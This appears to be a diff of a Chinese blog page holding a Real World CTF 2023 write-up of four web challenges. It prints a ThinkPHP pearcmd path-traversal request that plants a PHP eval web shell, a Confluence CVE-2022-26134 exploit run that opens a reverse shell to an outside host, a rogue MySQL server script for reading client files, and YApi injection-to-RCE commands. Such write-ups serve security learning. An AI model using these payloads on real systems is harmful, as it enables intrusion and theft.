@@ -8,9 +8,7 @@
     <meta name="description" content="d体验赛也记录一下吧！
 
 
-
-
-WEBBe-a-Language-Expert题目描述Web,difficulty:Baby I heard that there was a vulnerability in ThinkPHP recent">
+WEBBe-a-Language-Expert题目描述Web,difficulty:Baby I heard that there was a vulnerability in ThinkPHP recently">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -506,16 +504,14 @@ WEBBe-a-Language-Expert题目描述Web,difficulty:Baby I heard that there was a 
             <div id="articleContent">
                 <p>d体验赛也记录一下吧！</p>
 <span id="more"></span>
-
 <!--toc-->
-
 <h2 id="web"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="be-a-language-expert"><a href="#Be-a-Language-Expert" class="headerlink" title="Be-a-Language-Expert"></a>Be-a-Language-Expert</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><code>Web</code>,<code>difficulty:Baby</code> I heard that there was a vulnerability in ThinkPHP recently, but luckily I set the permissions low and ran it in a docker container, so no one can RCE me.</p>
 <p><a target="_blank" rel="noopener" href="http://47.98.124.175:8080/">http://47.98.124.175:8080</a></p>
 <h4 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h4><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>这题从群里大佬哪里拿到相关链接：</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/352360.html">ThinkPHP多语言模块文件包含RCE复现详细教程</a></p>
 <p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1865/#toc__4">Thinkphp 多语言 RCE</a></p>
-<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>在 &#x2F;tmp&#x2F; 下生成 hello.php</p>
-<p>直接利用p牛文章中的请求包，需要根据实际情况改变文件名称，写不进去可以考虑多加点..&#x2F;</p>
+<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>在 /tmp/ 下生成 hello.php</p>
+<p>直接利用p牛文章中的请求包，需要根据实际情况改变文件名称，写不进去可以考虑多加点../</p>
 <pre class="line-numbers language-http" data-language="http"><code class="language-http">GET &#x2F;index.php?lang&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;+config-create+&#x2F;&amp;&#x2F;&lt;?&#x3D;@eval($_REQUEST[&#39;1&#39;]);?&gt;+&#x2F;tmp&#x2F;2.php HTTP&#x2F;1.1
 Host: 47.98.124.175:8080
 Cache-Control: max-age&#x3D;0
@@ -528,13 +524,11 @@ Cookie: think_lang&#x3D;zh-cn
 Connection: close
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/images/Real-World-CTF-2023%E4%BD%93%E9%AA%8C%E8%B5%9B/image-20230108101108304.png" alt="image-20230108101108304"></p>
+<p><img src="/images/Real-World-CTF-2023体验赛/image-20230108101108304.png" alt="image-20230108101108304"></p>
 <p>包含 2.php，并用蚁剑连接</p>
-<p><img src="/images/Real-World-CTF-2023%E4%BD%93%E9%AA%8C%E8%B5%9B/image-20230108101215262.png" alt="image-20230108101215262"></p>
+<p><img src="/images/Real-World-CTF-2023体验赛/image-20230108101215262.png" alt="image-20230108101215262"></p>
 <p>最后在根目录下运行 <code>./readflag</code> 获取 flag。（速度要快，服务器好像会定时删除 tmp 目录下的所有文件，尝试写文件的结果一直不行）</p>
 <h3 id="be-a-wiki-hacker"><a href="#Be-a-Wiki-Hacker" class="headerlink" title="Be-a-Wiki-Hacker"></a>Be-a-Wiki-Hacker</h3><h4 id="题目描述"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><pre class="line-numbers language-none"><code class="language-none">Web&#96;,&#96;difficulty:Normal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>Your wiki is my wiki.</p>
 <p><a target="_blank" rel="noopener" href="http://47.98.212.188:8080/">http://47.98.212.188:8080/</a></p>
 <h4 id="题目内容"><a href="#题目内容-1" class="headerlink" title="题目内容"></a>题目内容</h4><h4 id="题目分析"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>打开发现是基于基于 Atlassian Confluence 7.13.6 技术构建，直接搜，正好碰到CVE-2022-26134</p>
@@ -542,21 +536,19 @@ Connection: close
 <p>工具：<a target="_blank" rel="noopener" href="https://github.com/0x14dli/cve2022-26134exp">https://github.com/0x14dli/cve2022-26134exp</a></p>
 <h4 id="解题步骤"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>直接使用反弹shell</p>
 <p>我用的是阿里云的服务器，反弹 shell 的时候要设置安全组允许题目的机器进来。</p>
-<p><img src="/images/Real-World-CTF-2023%E4%BD%93%E9%AA%8C%E8%B5%9B/image-20230111162407515.png" alt="image-20230111162407515"></p>
+<p><img src="/images/Real-World-CTF-2023体验赛/image-20230111162407515.png" alt="image-20230111162407515"></p>
 <p>运行如下命令反弹 shell</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nc -lvvp 12345
 python3 cve2022-26134exp.py -u http:&#x2F;&#x2F;47.98.212.188:8080&#x2F; -i 47.115.222.18 -p 12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="/images/Real-World-CTF-2023%E4%BD%93%E9%AA%8C%E8%B5%9B/image-20230111162604155.png" alt="image-20230111162604155"></p>
+<p><img src="/images/Real-World-CTF-2023体验赛/image-20230111162604155.png" alt="image-20230111162604155"></p>
 <h3 id="evil-mysql-server"><a href="#Evil-MySQL-Server" class="headerlink" title="Evil MySQL Server"></a>Evil MySQL Server</h3><h4 id="题目描述"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><pre class="line-numbers language-none"><code class="language-none">Web&#96;,&#96;difficulty:Normal<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>Please do not connect to an evil mysql server.</p>
 <p><a target="_blank" rel="noopener" href="http://116.62.153.136:8080/">http://116.62.153.136:8080/</a></p>
 <p>P.S. flag path: <code>/flag</code></p>
 <h4 id="题目内容"><a href="#题目内容-2" class="headerlink" title="题目内容"></a>题目内容</h4><h4 id="题目分析"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>本题考点是 Mysql LOAD DATA 读取客户端任意文件漏洞。</p>
 <h4 id="解题步骤"><a href="#解题步骤-2" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>注意要把云服务器的安全组设置一下，允许题目的机器进来！！！</p>
 <p>不过不知道为啥火炬木的 POC 不好使，我只好拿网上的魔改了一下然后成功了。</p>
-<p><img src="/images/Real-World-CTF-2023%E4%BD%93%E9%AA%8C%E8%B5%9B/image-20230111170008868.png" alt="image-20230111170008868"></p>
+<p><img src="/images/Real-World-CTF-2023体验赛/image-20230111170008868.png" alt="image-20230111170008868"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;python
 #coding: utf8
 import socket
@@ -598,28 +590,20 @@ while True:
         break
     # Don&#39;t leave the connection open.
     conn.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>POC地址：<a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
 <h3 id="yummy-api"><a href="#Yummy-Api" class="headerlink" title="Yummy Api"></a>Yummy Api</h3><h4 id="题目描述"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><pre class="line-numbers language-none"><code class="language-none">Web&#96;,&#96;difficulty:Baby<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>What bad intentions could there be for a yummy api?</p>
 <p><a target="_blank" rel="noopener" href="http://47.98.161.119:8080/">http://47.98.161.119:8080</a> <a target="_blank" rel="noopener" href="http://47.98.161.119:9090/">http://47.98.161.119:9090</a></p>
 <h4 id="题目内容"><a href="#题目内容-3" class="headerlink" title="题目内容"></a>题目内容</h4><h4 id="题目分析"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/yapi/mongodb-inj/poc.py">https://github.com/vulhub/vulhub/blob/master/yapi/mongodb-inj/poc.py</a></p>
 <h4 id="解题步骤"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>直接运行 POC 即可</p>
 <pre class="line-numbers language-none"><code class="language-none">python poc.py --debug one4all -u http:&#x2F;&#x2F;47.98.161.119:8080&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p><img src="/images/Real-World-CTF-2023%E4%BD%93%E9%AA%8C%E8%B5%9B/image-20230111164755233.png" alt="image-20230111164755233"></p>
+<p><img src="/images/Real-World-CTF-2023体验赛/image-20230111164755233.png" alt="image-20230111164755233"></p>
 <p>根据建议执行命令</p>
 <pre class="line-numbers language-none"><code class="language-none">python poc.py rce -u http:&#x2F;&#x2F;47.98.161.119:8080&#x2F; -t 8fa743801266b2391d16 -o 11 --pid 66 --cid 66 --command&#x3D;&quot;&#x2F;readflag&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/Real-World-CTF-2023%E4%BD%93%E9%AA%8C%E8%B5%9B/image-20230111164837962.png" alt="image-20230111164837962"></p>
-<p><img src="/images/Real-World-CTF-2023%E4%BD%93%E9%AA%8C%E8%B5%9B/image-20230111164855341.png" alt="image-20230111164855341"></p>
+<p><img src="/images/Real-World-CTF-2023体验赛/image-20230111164837962.png" alt="image-20230111164837962"></p>
+<p><img src="/images/Real-World-CTF-2023体验赛/image-20230111164855341.png" alt="image-20230111164855341"></p>
 <h3 id="wp"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hZBvhedDCBzEuzSd021l6Q">官方wp</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4NzcxOTI0OQ==&mid=2247485039&idx=1&sn=0d9b496925004fded48f2a59b6de6089&chksm=cf875251f8f0db47110248111d879f72bb86fcd73c4de370d836c0da9526547ec8c014ff80cd&scene=126&sessionid=1673276576#rd">火炬木攻防实验室</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4NzcxOTI0OQ==&amp;mid=2247485039&amp;idx=1&amp;sn=0d9b496925004fded48f2a59b6de6089&amp;chksm=cf875251f8f0db47110248111d879f72bb86fcd73c4de370d836c0da9526547ec8c014ff80cd&amp;scene=126&amp;sessionid=1673276576#rd">火炬木攻防实验室</a></p>
 
                 
             </div>
@@ -874,7 +858,6 @@ while True:
                     <div class="summary block-with-text">
                         
                             
-
 记录一些大佬的博客
                         
                     </div>
@@ -1007,7 +990,7 @@ while True:
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -1019,7 +1002,7 @@ while True:
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1148,7 +1131,7 @@ while True:
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
